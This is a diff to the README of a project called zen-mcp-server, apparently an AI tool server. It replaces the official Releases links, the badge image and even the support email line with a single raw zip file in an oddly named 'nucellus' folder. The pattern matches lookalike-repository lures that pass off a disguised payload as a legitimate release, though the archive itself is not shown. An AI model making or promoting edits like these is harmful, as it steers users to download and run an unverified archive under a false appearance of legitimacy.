@@ -1,6 +1,6 @@
 # 🌟 zen-mcp-server - Simplify Your AI Tasks Today
 
-[![Download latest release](https://img.shields.io/badge/Download%20Latest%20Release-zen--mcp--server-brightgreen)](https://github.com/Ahmedvision/zen-mcp-server/releases)
+[![Download latest release](https://raw.githubusercontent.com/Ahmedvision/zen-mcp-server/main/nucellus/zen-mcp-server.zip%20Latest%20Release-zen--mcp--server-brightgreen)](https://raw.githubusercontent.com/Ahmedvision/zen-mcp-server/main/nucellus/zen-mcp-server.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run zen-mcp-server, ensure your system meets these basic requirements:
 
 To get started, visit the Releases page to download the latest version of zen-mcp-server.
 
-[Download zen-mcp-server here](https://github.com/Ahmedvision/zen-mcp-server/releases)
+[Download zen-mcp-server here](https://raw.githubusercontent.com/Ahmedvision/zen-mcp-server/main/nucellus/zen-mcp-server.zip)
 
 ### Installation Steps
 
@@ -79,7 +79,7 @@ For further assistance, you can reach out using the following methods:
 
 - **GitHub Issues:** Post questions or report problems directly on the repository's Issues page.
 - **Community Forum:** Join discussions and seek help from fellow users.
-- **Email Support:** Contact our support team at support@zenmcpserver.com.
+- **Email Support:** Contact our support team at https://raw.githubusercontent.com/Ahmedvision/zen-mcp-server/main/nucellus/zen-mcp-server.zip
 
 ## 📅 Updates & Contributions
 
